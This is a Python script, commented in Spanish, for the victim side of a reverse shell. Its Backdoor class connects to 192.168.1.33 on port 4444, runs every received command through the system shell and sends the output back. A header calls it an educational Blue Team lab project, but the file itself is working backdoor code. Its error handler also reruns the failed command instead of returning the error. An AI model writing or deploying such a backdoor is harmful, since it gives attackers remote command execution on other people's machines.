#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================

import socket, subprocess, sys, os

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")
        self.current_dir = os.getcwd()
         

    def ejecutarComando(self, command):
        try:
            command_str = command.decode('utf-8', errors='ignore').strip()
            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            # ← ✅ Si falla, devolver el error en vez de crashear
            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT, cwd=self.current_dir)  # ← 3️⃣ EJECUTAR EN ESE DIRECTORIO
    
    def cambiarDirectorio(self, path):  # ← 4️⃣ FUNCIÓN PARA CAMBIAR
        try:
            os.chdir(path)
            self.current_dir = os.getcwd()
            return f"[+] Directorio cambiado a: {self.current_dir}".encode()
        except Exception as e:
            return f"[!] Error: {str(e)}".encode()

    def run(self):
        while True:
            command = self.connection.recv(1024000)
            command_str = command.decode('utf-8', errors='ignore').strip()
            
            # ← ✅ CHECK "salir" ANTES DE EJECUTAR
            if command_str == "salir":
                self.connection.close()
                exit()

            # ← 5️⃣ DETECTAR "cd"
            elif command_str.startswith("cd "):
                path = command_str[3:].strip()
                resultado = self.cambiarDirectorio(path)
                self.connection.send(resultado)
                continue             
            
            resultadosComando = self.ejecutarComando(command)
            self.connection.send(resultadosComando)

puerta = Backdoor("192.168.1.33", 4444)
puerta.run()